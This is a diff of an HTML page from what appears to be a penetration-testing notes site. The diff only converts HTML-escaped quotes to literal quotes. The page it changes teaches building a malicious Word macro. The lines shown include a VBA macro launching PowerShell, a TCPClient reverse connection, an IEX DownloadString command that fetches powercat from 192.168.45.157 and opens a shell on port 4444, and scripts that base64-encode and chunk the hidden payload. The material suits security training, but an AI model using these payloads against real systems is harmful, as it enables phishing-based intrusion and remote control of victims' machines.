@@ -26741,7 +26741,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>End Sub
 </span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>
 </span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>Sub MyMacro()
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>  CreateObject("Wscript.Shell").Run "powershell"
 </span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a>End Sub
 </span></code></pre></div></td></tr></table></div>
 <p><strong>2.</strong> Convert it to a VisualBasic script - macro code. <a href="https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office">Documentation about VBA</a></p>
@@ -26766,7 +26766,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p><strong>2.2. Method 2: Project reverse</strong></p>
 <p>Another interesting script is the VBA Macro (powershell base64) available from my <a href="https://amandaguglieri.github.io/reverse/">reverse project repo</a>, which makes a simple connection with:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.10&quot;,9001)
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001)
 </span></code></pre></div></td></tr></table></div>
 <p>Just go to <a href="https://amandaguglieri.github.io/reverse/">Reverse project repo</a>, and select the VBA macro.</p>
 <p><strong>2.3. Method 3: downloading powercat and establishing the connection</strong></p>
@@ -26776,7 +26776,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>Initiates a connection with powercat.ps1</li>
 </ol>
 <p>We can define the initial payload like this:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.157/powercat.ps1&#39;);powercat -c 192.168.45.157 -p 4444 -e powershell
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');powercat -c 192.168.45.157 -p 4444 -e powershell
 </span></code></pre></div></td></tr></table></div>
 <p>Then, use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the <em>Str</em> variable. </p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
@@ -26790,16 +26790,16 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
 <span class="normal"><a href="#__codelineno-4-10">10</a></span>
 <span class="normal"><a href="#__codelineno-4-11">11</a></span>
-<span class="normal"><a href="#__codelineno-4-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>bash<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="s">payload=$(echo -n &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.157/powercat.ps1&#39;);.\powercat.ps1 -c 192.168.45.157 -p 4444 -e powershell&quot; | iconv -t UTF-16LE | base64 -w 0)</span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>bash<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="s">payload=$(echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');.\powercat.ps1 -c 192.168.45.157 -p 4444 -e powershell" | iconv -t UTF-16LE | base64 -w 0)</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="s">str=&quot;powershell.exe -nop -w hidden -enc $payload&quot;</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="s">str="powershell.exe -nop -w hidden -enc $payload"</span>
 </span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>
 </span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="s">n=50</span>
 </span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="s">len=${#str}</span>
 </span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>
 </span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="s">for (( i=0; i&lt;len; i+=n )); do</span>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="s">    echo &quot;str = str + \&quot;${str:i:n}\&quot;&quot;</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="s">    echo "str = str + \"${str:i:n}\""</span>
 </span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="s">done</span>
 </span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a><span class="s">EOF</span>
 </span></code></pre></div></td></tr></table></div>
@@ -26815,16 +26815,16 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
 <span class="normal"><a href="#__codelineno-5-10">10</a></span>
 <span class="normal"><a href="#__codelineno-5-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a># conver the payload
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.157/powercat.ps1&#39;);powercat -c 192.168.45.157 -p 4444 -e powershell
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');powercat -c 192.168.45.157 -p 4444 -e powershell
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a># to base64
 </span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>
 </span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>str = &quot;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA...&quot;
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."
 </span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a>
 </span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>n = 50
 </span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>
 </span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a>for i in range(0, len(str), n):
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a>    print(&quot;Str = Str + &quot; + &#39;&quot;&#39; + str[i:i+n] + &#39;&quot;&#39;)
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a>    print("Str = Str + " + '"' + str[i:i+n] + '"')
 </span></code></pre></div></td></tr></table></div>
 <p>In any case, after the macro is executed, we receive a GET request for the PowerCat script in our Python3 web server and an incoming reverse shell in our Netcat listener.</p>
 <p><strong>3.</strong> Create an MS Word document</p>
